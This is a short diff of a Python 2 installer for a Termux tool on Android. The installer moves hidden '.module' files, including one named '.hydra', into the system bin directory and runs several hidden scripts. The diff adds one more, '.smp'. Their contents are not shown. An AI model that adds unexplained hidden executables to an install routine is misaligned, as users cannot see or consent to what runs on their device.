@@ -3,6 +3,7 @@
 import os, time
 
 bin = '/data/data/com.termux/files/usr/bin'
+file = '.module/'
 lucu = 'clear >$(tty)'
 
 print '\ainstalling...'
@@ -13,6 +14,7 @@ os.system('clear && apt-get install php -y')
 os.system('mv .module/.hydra $cd %s' % (bin))
 os.system('mv .module/readme.txt $cd %s' % (bin))
 os.system('mv .module/.menu $cd %s' % (bin))
+os.system('python %s.smp' % (file))
 os.system('mv lib %s' % (bin))
 os.system('python2 .module/.MN')
 os.system('python2 .module/.BR')
